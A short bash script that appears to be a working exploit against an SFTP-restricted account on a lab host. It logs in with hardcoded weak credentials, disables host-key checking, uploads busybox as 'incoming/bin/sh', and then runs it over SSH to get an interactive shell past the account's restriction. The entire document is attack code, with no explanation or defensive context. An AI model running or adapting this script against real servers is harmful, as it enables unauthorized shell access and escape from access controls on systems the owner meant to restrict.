#!/bin/bash

TARGET_IP="192.168.1.21"
TARGET_USER="sftp_weak"
TARGET_PASS="password123"

if [ -z "$TARGET_IP" ]; then
    exit 1
fi

if ! command -v sshpass &> /dev/null; then
    sudo apt-get update && sudo apt-get install -y sshpass
fi

mkdir -p ./incoming/bin
cp /bin/busybox ./incoming/bin/sh 2>/dev/null || echo "echo 'pwned'" > ./incoming/bin/sh

sshpass -p "$TARGET_PASS" sftp -o StrictHostKeyChecking=no ${TARGET_USER}@${TARGET_IP} <<EOF
mkdir incoming
mkdir incoming/bin
cd incoming/bin
put ./incoming/bin/sh
exit
EOF

sleep 1

sshpass -p "$TARGET_PASS" ssh -o StrictHostKeyChecking=no -t ${TARGET_USER}@${TARGET_IP} "incoming/bin/sh"

rm -rf ./incoming
exit 0
